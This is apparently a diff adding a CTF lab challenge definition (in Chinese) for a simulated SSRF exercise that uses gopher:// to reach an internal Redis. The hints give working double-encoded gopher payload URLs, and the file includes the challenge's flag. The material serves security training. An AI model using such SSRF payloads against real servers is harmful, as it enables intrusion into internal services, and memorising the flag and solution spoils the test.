@@ -1,0 +1,25 @@
+{
+  "id": "ssrf4",
+  "category": "ssrf",
+  "title": "内网服务探测助手 · gopher 打内网 Redis（模拟）",
+  "difficulty": "hard",
+  "url_path": "/ssrf4",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{ssrf4_a7af29b7}",
+  "knowledge": [
+    "gopher:// 任意 TCP 报文（/_ 后原样发送）",
+    "双重 URL 编码 %250d%250a",
+    "dict:// 按行发送",
+    "Redis 未授权访问与真实打法",
+    "依赖：php curl 扩展（或自动回退 fsockopen）"
+  ],
+  "hints": [
+    "PING 探活：?url=gopher://127.0.0.1:6379/_PING%250d%250a（返回 +PONG）",
+    "PHP 解一层码、gopher 再解一层：想让 Redis 收到 GET flag\\r\\n 就写 GET%2520flag%250d%250a",
+    "?url=gopher://127.0.0.1:6379/_GET%2520flag%250d%250a（部署：php redis_fake.php 常驻 127.0.0.1:6379 + /flag_ssrf4.txt）"
+  ],
+  "writeup": "writeup.md",
+  "prev": "ssrf3",
+  "next": null
+}
